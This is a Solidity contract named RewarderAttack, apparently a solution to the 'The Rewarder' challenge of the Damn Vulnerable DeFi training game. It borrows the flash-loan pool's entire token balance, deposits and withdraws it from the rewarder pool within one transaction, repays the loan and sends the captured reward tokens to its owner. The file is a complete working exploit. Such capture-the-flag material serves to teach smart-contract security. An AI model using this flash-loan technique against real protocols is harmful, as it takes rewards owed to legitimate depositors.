// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/RewardToken.sol";
import "../the-rewarder/AccountingToken.sol";
import "../DamnValuableToken.sol";

contract RewarderAttack {

    using Address for address;

    FlashLoanerPool flashLoanerPool;
    TheRewarderPool theRewarderPool;
    DamnValuableToken damnValuableToken;
    RewardToken rewardToken;

    address owner;

    constructor(
        address _flashLoanerPoolAddress, 
        address _theRewarderPoolAddress, 
        address _damnValuableTokenAddress, 
        address _rewardTokenAddress
    ) {
        owner = msg.sender;
        damnValuableToken = DamnValuableToken(_damnValuableTokenAddress);
        flashLoanerPool = FlashLoanerPool(_flashLoanerPoolAddress);
        theRewarderPool = TheRewarderPool(_theRewarderPoolAddress);
        rewardToken = RewardToken(_rewardTokenAddress);
    }

    function requestFlashLoan() external {
        require(msg.sender == owner, "Only owner allowed");
        uint256 poolBalance = damnValuableToken.balanceOf(address(flashLoanerPool));
        flashLoanerPool.flashLoan(poolBalance);
    }


    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == address(flashLoanerPool), "Only pool allowed");

        damnValuableToken.approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);
        theRewarderPool.withdraw(amount);
        damnValuableToken.transfer(address(flashLoanerPool), amount);

        uint256 rewardsBalance = rewardToken.balanceOf(address(this));
        require(rewardToken.transfer(owner, rewardsBalance), "Rewards Withdrawal to Owner Failed");

    }

}